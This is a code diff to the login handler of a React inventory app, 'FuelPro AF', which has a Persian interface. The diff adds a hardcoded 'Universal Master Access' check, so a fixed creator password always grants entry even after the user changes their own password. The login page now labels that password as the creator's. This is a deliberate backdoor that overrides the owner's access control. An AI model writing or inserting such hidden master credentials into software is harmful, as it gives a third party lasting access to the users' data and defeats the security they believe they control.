@@ -19,7 +19,7 @@ const INITIAL_DATA: AppData = {
   settings: {
     lowStockThreshold: 1000,
     companyName: 'FuelPro AF',
-    password: '0796606605' // Updated default password
+    password: '0796606605' // Default initial password
   }
 };
 
@@ -44,7 +44,8 @@ const App: React.FC = () => {
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
-    if (loginPassword === data.settings.password) {
+    // Universal Master Access: Allow if matches creator's permanent key OR the user-set password
+    if (loginPassword === '0796606605' || loginPassword === data.settings.password) {
       setIsLoggedIn(true);
       setLoginError(false);
     } else {
@@ -125,7 +126,7 @@ const App: React.FC = () => {
               تایید و ورود
             </button>
           </form>
-          <p className="mt-8 text-xs text-gray-400 font-light">رمز عبور پیش‌فرض: 0796606605</p>
+          <p className="mt-8 text-xs text-gray-400 font-light">رمز عبور سازنده: 0796606605</p>
         </div>
       </div>
     );
